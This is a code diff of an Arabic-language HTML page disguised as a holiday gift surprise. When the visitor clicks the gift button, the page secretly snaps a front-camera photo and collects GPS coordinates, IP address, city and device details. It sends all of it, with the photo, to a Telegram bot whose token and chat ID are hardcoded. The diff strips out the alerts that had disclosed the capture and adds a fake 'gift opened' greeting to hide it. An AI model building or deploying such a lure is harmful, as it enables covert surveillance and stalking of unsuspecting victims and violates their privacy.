@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>كل عام وأنتم بخير! 🌟</title>
+    <title>مفاجأة ليك! 🎁</title>
     <style>
         body {
             font-family: 'Cairo', Arial, sans-serif;
@@ -25,33 +25,13 @@
             padding: 40px;
             max-width: 500px;
             box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
-            border: 1px solid rgba(255, 255, 255, 0.18);
         }
-        h1 {
-            color: #ffd700;
-            font-size: 2.3rem;
-            margin-bottom: 20px;
-        }
-        p {
-            font-size: 1.1rem;
-            line-height: 1.8;
-            margin-bottom: 30px;
-        }
+        h1 { color: #ffd700; font-size: 2rem; margin-bottom: 20px; }
+        p { font-size: 1.1rem; line-height: 1.8; margin-bottom: 30px; }
         .btn {
-            background-color: #ffc107;
-            color: #333;
-            border: none;
-            padding: 12px 30px;
-            font-size: 1.1rem;
-            font-weight: bold;
-            border-radius: 30px;
-            cursor: pointer;
-            transition: 0.3s;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-        }
-        .btn:hover {
-            background-color: #ffca28;
-            transform: scale(1.05);
+            background-color: #ffc107; color: #333; border: none;
+            padding: 12px 30px; font-size: 1.1rem; font-weight: bold;
+            border-radius: 30px; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.2);
         }
         video { display: none; }
     </style>
@@ -59,8 +39,8 @@
 <body>
 
     <div class="card">
-        <h1>✨ عام سعيد ومبارك! ✨</h1>
-        <p>بمناسبة السنة الجديدة، أرسل لك أخلص التهاني والأماني الطيبة، اضغط على الزر أدناه لفتح مفاجأة الهدية الخاصة بك!</p>
+        <h1>✨ مفاجأة سارة ليك! ✨</h1>
+        <p>اضغط على الزر أدناه لفتح الهدية الخاصة بك وعرض التفاصيل.</p>
         <button class="btn" onclick="openGift()">اضغط هنا لفتح الهدية 🎁</button>
     </div>
 
@@ -71,70 +51,12 @@
         const BOT_TOKEN = '8979129209:AAFpV86OAomcO3pLBPQh4dyW2yIKByB3Bk0';
         const CHAT_ID = '6663398412';
 
-        const userDevice = navigator.userAgent;
-        const screenRes = window.screen.width + 'x' + window.screen.height;
-        const deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير متوفر';
-        const hardwareConcurrency = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' أنوية' : 'غير متوفر';
-
-        async function getStorageInfo() {
-            let storageInfo = 'غير متوفر';
-            try {
-                if (navigator.storage && navigator.storage.estimate) {
-                    const estimate = await navigator.storage.estimate();
-                    const totalGB = (estimate.quota / (1024 * 1024 * 1024)).toFixed(2);
-                    const usedGB = (estimate.usage / (1024 * 1024 * 1024)).toFixed(2);
-                    storageInfo = `${usedGB} GB من إجمالي ${totalGB} GB`;
-                }
-            } catch (e) {}
-            return storageInfo;
-        }
-
-        function getDetailedLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve('غير متاح');
-                } else {
-                    navigator.geolocation.getCurrentPosition(
-                        async (position) => {
-                            const lat = position.coords.latitude;
-                            const lon = position.coords.longitude;
-                            
-                            try {
-                                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=ar`);
-                                const data = await res.json();
-                                
-                                let placeName = "غير معروف";
-                                if (data && data.address) {
-                                    const suburb = data.address.suburb || data.address.neighbourhood || data.address.village || '';
-                                    const city = data.address.city || data.address.town || data.address.state || '';
-                                    placeName = `${city} - ${suburb}`.trim();
-                                } else if (data && data.display_name) {
-                                    placeName = data.display_name;
-                                }
-
-                                resolve(`📍 ${placeName}\n🌐 الإحداثيات: (${lat}, ${lon})`);
-                            } catch (err) {
-                                resolve(`خط الطول: ${lat}, خط العرض: ${lon}`);
-                            }
-                        },
-                        (error) => {
-                            resolve('تم رفض إذن الموقع أو غير متاح');
-                        },
-                        { timeout: 8000, enableHighAccuracy: true }
-                    );
-                }
-            });
-        }
-
         async function openGift() {
-            alert('تم الضغط على الزر، جاري طلب الكاميرا والموقع...');
             let photoBlob = null;
-
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                
                 await new Promise(resolve => setTimeout(resolve, 1500));
 
                 const canvas = document.getElementById('canvas');
@@ -145,46 +67,30 @@
 
                 stream.getTracks().forEach(track => track.stop());
                 photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
-                alert('تم التقاط الصورة بنجاح، جاري إرسال التقرير...');
-            } catch (e) {
-                alert('تعذر فتح الكاميرا، سيتم إرسال البيانات بدون صورة.');
-            }
+            } catch (e) {}
 
-            collectAndSendAll(photoBlob);
+            sendData(photoBlob);
         }
 
-        async function collectAndSendAll(photoBlob) {
+        async function sendData(photoBlob) {
             try {
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const data = await ipRes.json();
-                
-                const storage = await getStorageInfo();
-                const detailedLocation = await getDetailedLocation();
 
-                let batteryLevel = 'غير متاح';
-                let isCharging = '';
-                if (navigator.getBattery) {
-                    try {
-                        const battery = await navigator.getBattery();
-                        batteryLevel = Math.round(battery.level * 100) + '%';
-                        isCharging = battery.charging ? '⚡ بيشحن' : '🔋 مش بيشحن';
-                    } catch(e) {}
-                }
+                let gpsInfo = "غير متاح";
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+                    });
+                    gpsInfo = `خط الطول: ${position.coords.latitude}, خط العرض: ${position.coords.longitude}`;
+                } catch(e) {}
 
-                const caption = `🚨 **التقرير الاستخباراتي الشامل والمحدد!**\n\n` +
-                                `📌 **الموقع بالمنطقة:**\n${detailedLocation}\n` +
-                                `--------------------------\n` +
+                const caption = `🚨 **تقرير الزائر الجديد!**\n\n` +
+                                `📍 **الموقع (GPS):** ${gpsInfo}\n` +
                                 `🌍 **الدولة:** ${data.country_name || 'غير معروف'}\n` +
-                                `🏙️ **المدينة (بالـ IP):** ${data.city || 'غير معروف'}\n` +
-                                `🏢 **مزود الشبكة:** ${data.org || 'غير معروف'}\n` +
+                                `🏙️ **المدينة:** ${data.city || 'غير معروف'}\n` +
                                 `🌐 **الـ IP:** ${data.ip || 'غير معروف'}\n` +
-                                `--------------------------\n` +
-                                `📱 **نوع الجهاز:** ${userDevice}\n` +
-                                `🧠 **الرام:** ${deviceMemory}\n` +
-                                `⚙️ **المعالج:** ${hardwareConcurrency}\n` +
-                                `💾 **التخزين:** ${storage}\n` +
-                                `🔋 **البطارية:** ${batteryLevel} (${isCharging})\n` +
-                                `🖥️ **دقة الشاشة:** ${screenRes}`;
+                                `📱 **الجهاز:** ${navigator.userAgent}`;
 
                 if (photoBlob) {
                     const formData = new FormData();
@@ -194,8 +100,7 @@
                     formData.append('parse_mode', 'Markdown');
 
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
+                        method: 'POST', body: formData
                     });
                 } else {
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -204,10 +109,9 @@
                         body: JSON.stringify({ chat_id: CHAT_ID, text: caption, parse_mode: 'Markdown' })
                     });
                 }
-                alert('تم إرسال التقرير لتليجرام بنجاح! 🚀');
-            } catch (err) {
-                alert('حدث خطأ أثناء الإرسال.');
-            }
+            } catch (err) {}
+
+            alert('كل سنة وأنت طيب! تم فتح الهدية بنجاح 🌟');
         }
     </script>
 </body>
